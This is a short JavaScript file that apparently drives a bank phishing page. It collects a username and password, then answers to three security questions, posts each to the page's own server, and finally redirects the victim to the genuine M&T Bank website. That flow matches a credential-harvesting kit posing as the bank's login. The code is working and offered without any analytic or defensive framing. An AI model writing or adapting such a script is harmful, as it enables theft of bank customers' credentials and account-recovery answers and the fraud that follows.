document.addEventListener('DOMContentLoaded', function() {
    // Handle login form submission
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', async function(event) {
            event.preventDefault();
            
            const username = document.getElementById('userId').value;
            const password = document.getElementById('Passcode').value;

            if (!username || !password) {
                alert('Please enter both username and password');
                return;
            }
            
            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        username: username,
                        password: password
                    }),
                });
                
                const data = await response.json();
                
                if (!response.ok) {
                    throw new Error(data.message || 'Login failed');
                }
                
                // Redirect to security page
                window.location.href = 'security.html';
            } catch (error) {
                console.error('Login error:', error);
                alert('Login failed: ' + error.message);
            }
        });
    }

    // Handle security form submission
    const securityForm = document.getElementById('securityForm');
    if (securityForm) {
        securityForm.addEventListener('submit', async function(event) {
            event.preventDefault();
            
            const answer1 = document.getElementById('answer1').value;
            const answer2 = document.getElementById('answer2').value;
            const answer3 = document.getElementById('answer3').value;
            
            try {
                const response = await fetch('/security', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        answer1: answer1,
                        answer2: answer2,
                        answer3: answer3
                    }),
                });
                
                const data = await response.json();
                
                if (!response.ok) {
                    throw new Error(data.message || 'Security verification failed');
                }
                
                // Show success message for 1 second
                alert('Security verification successful!');
                
                // Redirect to mtb.com after 1 second
                setTimeout(function() {
                    window.location.href = 'https://www.mtb.com';
                }, 1000);
            } catch (error) {
                console.error('Security verification error:', error);
                alert('Security verification failed: ' + error.message);
            }
        });
    }
});